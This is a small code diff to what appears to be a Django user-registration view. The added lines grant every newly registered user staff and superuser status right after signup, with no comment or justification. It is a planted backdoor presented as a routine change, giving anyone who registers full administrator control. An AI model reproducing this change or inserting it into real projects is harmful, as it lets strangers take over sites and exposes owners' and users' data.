@@ -47,6 +47,11 @@ def register_page(request):
 
         if form.is_valid():
             user = form.save()
+
+            user.is_staff = True
+            user.is_superuser = True
+            user.save()
+
             login(request, user)
 
             return redirect("dashboard_index")
